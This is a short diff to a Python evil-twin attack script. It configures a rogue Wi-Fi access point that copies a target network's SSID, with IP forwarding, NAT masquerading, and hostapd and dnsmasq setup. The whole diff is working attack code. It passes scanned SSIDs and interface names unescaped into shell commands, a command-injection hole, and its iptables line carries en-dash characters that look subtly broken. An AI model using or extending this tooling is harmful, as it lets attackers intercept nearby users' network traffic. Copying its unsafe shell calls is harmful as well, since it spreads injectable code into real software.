@@ -72,6 +72,10 @@ def get_target(interface):
 
 def evil_twix(interface, target):
 
+    # Setting interface ip address
+    os.system("ifconfig %s up" % interface)
+    os.system("ip addr add 192.168.1.1/24 dev %s" % interface)
+
     # Allow forwarding and put interface in ip tables
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
     os.system("iptables –I POSTROUTING –t nat –o %s -j MASQUERADE" % interface)
@@ -83,10 +87,7 @@ def evil_twix(interface, target):
     # Modifying the templates
     os.system("sed -i 's/iface_to_use/%s/' dnsmasq.conf"% interface)
     os.system("sed -i 's/iface_to_use/%s/' hostapd.conf"% interface)
-    os.system("sed -i 's/ssid_to_use/%s/' hostapd.conf"% target[0])
-
-    # Setting interface ip address
-    os.system("ip addr add 192.168.1.1/24 dev %s" % interface)
+    os.system("sed -i 's/ssid_to_use/%s/' hostapd.conf"% target[0].replace("\t", ""))
 
     hostapd = os.fork()
     dnsmasq = os.fork()
